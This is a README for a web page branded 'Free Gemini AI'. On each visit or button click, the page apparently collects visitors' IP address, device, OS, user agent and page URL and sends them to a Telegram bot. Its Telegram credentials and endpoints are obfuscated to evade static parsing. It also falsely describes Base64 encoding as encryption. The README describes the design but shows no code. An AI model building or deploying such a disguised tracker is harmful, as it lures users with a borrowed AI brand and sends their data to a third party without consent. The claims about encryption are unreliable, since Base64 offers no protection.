# Free Gemini AI — Encryption & Analytics Client

A clean, modern, and lightweight front-end web application that allows visitors to key in text, encrypts it on the client side, and automatically sends dynamic notifications to a Telegram channel.

---

## Features

- **Text Encryption**: Instantly encrypts user input using Base64 encoding on the client side.
- **Dynamic Device Detection**: Detects user environment and OS details:
  - Mobile: Android Phone, iPhone, iPad
  - Desktop: Windows PC, Mac PC, Linux PC
- **Obfuscated Configuration**: Telegram API credentials (`BOT_TOKEN` and `CHAT_ID`) and endpoint URLs are obfuscated and resolved at runtime to protect configuration details from basic static parsing.
- **Telegram Notification Integration**: Sends a clean HTML-formatted payload containing the visitor's IP, device details, timestamp, page URL, and user agent to the target Telegram channel.

---

## Files

- **[index.html](file:///Users/mac/Documents/MOLRYNA/freeeee/index.html)**: The modern card interface for user input.
- **[script.js](file:///Users/mac/Documents/MOLRYNA/freeeee/script.js)**: Front-end logic, encryption helper, and Telegram API integration.
- **[style.css](file:///Users/mac/Documents/MOLRYNA/freeeee/style.css)**: Sleek styling for the UI card.

---

## How to Test/Run

### 1. Locally in Browser
Simply open **`index.html`** in any modern web browser.


### 2. Live Notifications
When a user visits the page or clicks **"Generate Response"**:
- An IP lookup is initiated via `https://api.ipify.org`.
- A formatted HTML notification containing visitor details is pushed to the Telegram Bot.
- You can check the browser console (`F12 -> Console`) for any detailed logs or error outputs.